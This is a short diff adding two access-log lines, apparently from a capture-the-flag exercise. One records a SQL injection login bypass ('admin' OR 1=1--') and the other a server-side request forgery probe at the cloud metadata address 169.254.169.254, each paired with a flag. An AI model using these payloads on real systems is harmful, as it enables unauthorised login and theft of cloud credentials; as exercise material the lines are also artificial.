@@ -1,0 +1,2 @@
+192.168.1.50 - [20/Aug/2026] "GET /login?user=admin' OR 1=1-- HTTP/1.1" 200 - FLAG: tcs{boolean_based_bypass}
+192.168.1.50 - [20/Aug/2026] "GET /api/proxy?url=http://169.254.169.254/ tcs{internal_admin_bypass}" 200
